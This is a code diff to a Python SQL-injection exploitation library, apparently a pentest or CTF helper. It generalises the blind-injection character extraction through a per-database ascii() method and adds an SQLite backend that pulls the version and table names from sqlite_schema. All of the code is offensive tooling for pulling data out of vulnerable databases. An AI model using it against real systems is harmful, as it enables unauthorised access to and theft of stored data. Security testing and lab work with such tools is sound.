@@ -34,6 +34,10 @@ class SQLi(ABC):
         return rows
 
     @abstractmethod
+    def ascii(self):
+        pass
+
+    @abstractmethod
     def extract_int(self, column: str, table=None, condition=None, 
                     offset=None, verbose=False):
         pass
@@ -201,7 +205,7 @@ class BlindSQLi(SQLi, ABC):
         cur_str = ""
         while True:
             found = False
-            cur_column = f"ascii(substr({column},{len(cur_str) + 1},1))"
+            cur_column = self.ascii() + f"(substr({column},{len(cur_str) + 1},1))"
             if charset:
                 query = self.build_query(cur_column, table, condition, offset)
                 for c in charset:
@@ -249,6 +253,8 @@ class PostgreSQLi(SQLi, ABC):
                                              f"table_schema='{schema}' AND table_name='{table}'",
                                              verbose=verbose)
 
+    def ascii(self):
+        return "ascii"
 
 class MySQLi(SQLi, ABC):
     def get_database_version(self, verbose=False):
@@ -268,3 +274,28 @@ class MySQLi(SQLi, ABC):
         return self.extract_multiple_strings("column_name", "information_schema.columns",
                                              f"table_schema='{schema}' AND table_name='{table}'",
                                              verbose=verbose)
+
+    def ascii(self):
+        return "ascii"
+
+
+class SQLitei(SQLi, ABC):
+    def get_database_version(self, verbose=False):
+        return self.extract_string("sqlite_version()", verbose=verbose)
+
+    def get_current_user(self, verbose=False):
+        raise Exception("Not implemented!")
+
+    def get_current_database(self, verbose=False):
+        raise Exception("Not implemented!")
+
+    def get_table_names(self, verbose=False):
+        return self.extract_multiple_strings("name", "sqlite_schema", f"type='table'",
+                                             verbose=verbose)
+
+    def get_column_names(self, table: str, schema: str, verbose=False):
+        # TODO: we could query the "sql" column and parse it using regex
+        raise Exception("Not implemented!")
+
+    def ascii(self):
+        return "unicode"
